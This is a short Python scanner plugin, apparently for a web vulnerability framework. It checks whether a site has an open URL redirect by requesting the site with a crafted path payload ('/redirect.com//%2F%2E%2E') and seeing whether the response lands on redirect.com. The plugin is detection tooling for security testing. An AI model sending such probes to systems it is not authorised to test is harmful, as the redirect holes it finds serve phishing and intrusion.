#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = moonfish
#_PlugName_ = URL Redirector Abuse


def assign(service, arg):
    if service == fingerprint.www:
        return True, arg
def audit(arg):
    payload = '/redirect.com//%2F%2E%2E' #这里的/是必须的
    target = arg + payload
    code, head, res, final_url, log= hackhttp.http(target)
    if final_url.startswith("http://redirect.com"): #无需判断code
        security_info(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.www, 'http://www.example.com/')[1])
    audit(assign(fingerprint.www, 'http://www.example.com/')[1])